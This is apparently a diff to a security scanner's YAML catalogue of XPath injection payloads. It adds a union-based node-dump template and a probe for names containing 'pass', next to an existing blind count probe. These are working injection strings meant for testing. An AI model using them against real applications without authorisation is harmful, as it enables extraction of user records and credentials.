@@ -26,6 +26,14 @@ payloads:
     template: "' and count(//user)>5 and '1'='1"
     confidence: suspected
     notes: Blind XPath count probe; enumerates node cardinality without data dump.
+  - id: xpath_node_dump_union
+    template: "x'] | //user/* | //user[name()='x"
+    confidence: suspected
+    notes: Blind XPath escape that unions in all user nodes; XPath has no comment syntax so brackets/quotes must stay balanced.
+  - id: xpath_nodename_discovery
+    template: "*[contains(name(),'pass')]"
+    confidence: suspected
+    notes: Node-name discovery probe; enumerates element/attribute names containing "pass" without extracting values directly.
 mutations:
   - name: case_flip
     description: Flip case of XPath node/function names to probe case-sensitive evaluators.
